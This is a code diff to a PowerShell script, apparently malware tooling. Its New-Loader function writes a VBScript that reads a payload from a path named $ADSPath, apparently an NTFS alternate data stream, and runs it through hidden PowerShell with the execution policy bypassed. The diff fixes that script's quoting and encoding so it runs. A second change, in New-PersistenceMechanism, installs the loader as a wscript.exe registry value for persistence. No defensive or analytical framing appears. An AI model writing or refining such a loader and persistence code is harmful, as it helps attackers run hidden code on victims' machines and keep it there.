@@ -343,12 +343,18 @@ function New-Loader($ADSPath, $Config) {
     
     $vbsContent = @"
 On Error Resume Next
-Set shell=CreateObject("WScript.Shell"), strm=CreateObject("ADODB.Stream")
-strm.Type=2:strm.Charset="utf-8":strm.Open:strm.LoadFromFile("$ADSPath")
-payload=strm.ReadText:strm.Close
-shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"$payload`"",0,False
+Set shell = CreateObject("WScript.Shell")
+Set strm = CreateObject("ADODB.Stream")
+strm.Type = 2
+strm.Charset = "utf-8"
+strm.Open
+strm.LoadFromFile("$ADSPath")
+payload = strm.ReadText
+strm.Close
+shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command """ & payload & """, 0, False
 "@
-    $vbsContent | Out-File $loaderPath -Encoding Default -Force
+
+    $vbsContent | Out-File $loaderPath -Encoding ASCII -Force
     return $loaderPath
 }
 
@@ -429,7 +435,7 @@ function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
             }
             
             Set-ItemProperty -Path $regPath -Name $valueName -Value "wscript.exe $taskArgs" -Force
-            Write-Verbose "Registry persistence: $regPath\$valueName"
+            Write-Host "Registry persistence: $regPath\$valueName" -ForegroundColor Yellow
         }
         default { Write-Warning "Unknown persistence: $Type" }
     }
